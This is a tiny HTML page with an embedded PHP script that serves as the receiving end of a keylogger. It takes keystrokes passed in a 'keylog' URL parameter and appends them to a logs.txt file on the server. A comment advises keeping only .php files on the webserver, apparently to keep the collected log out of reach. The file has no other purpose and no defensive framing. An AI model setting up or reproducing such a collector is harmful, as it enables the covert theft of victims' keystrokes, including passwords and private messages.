<!DOCTYPE html>
<html lang="en-US">
<body>
<!-- It is advised that no file of file type other than .php must reside on the webserver -->

<?php
 
if(!empty($_GET['keylog'])) {
    $logfile = fopen('logs.txt', 'a+');
    fwrite($logfile, $_GET['keylog']);
    fclose($logfile);
}
?>

</body>
</html>
